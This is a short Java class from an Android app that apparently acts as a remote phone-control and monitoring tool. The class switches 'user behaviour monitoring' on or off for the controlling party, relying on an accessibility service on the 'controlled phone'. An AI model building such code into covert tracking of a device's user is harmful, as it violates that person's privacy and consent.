package com.lfish.control.action.actiondomian;

import com.google.gson.Gson;
import com.lfish.control.ControlApplication;
import com.lfish.control.action.BaseBeanAction;
import com.lfish.control.action.cmdparams.USerActivityParams;
import com.lfish.control.service.PhoneActivityService;

/**
 * Created by SuZhiwei on 2016/8/21.
 */
public class GetUserAcitivityAction extends BaseBeanAction {
    @Override
    public void run() {
        USerActivityParams uSerActivityParams = new Gson().fromJson(getProperties(),USerActivityParams.class);

        if(uSerActivityParams!=null && uSerActivityParams.isOpen()){
            PhoneActivityService.controlList.put(getFrom(),System.currentTimeMillis());
            if(PhoneActivityService.isAccessibilitySettingsOn(ControlApplication.context)){
                sendTxt("已经开启行为监控,以下消息为用户行为回执消息---");
            }else{
                sendTxt("被控手机没有开启辅助服务，如果您要开启，请手动操作被控手机：设置-》辅助功能-》无障碍-》匹诺监控辅助功能-》勾选或打开服务。");
            }
        }else{
            PhoneActivityService.controlList.remove(getFrom());
        }
    }
}
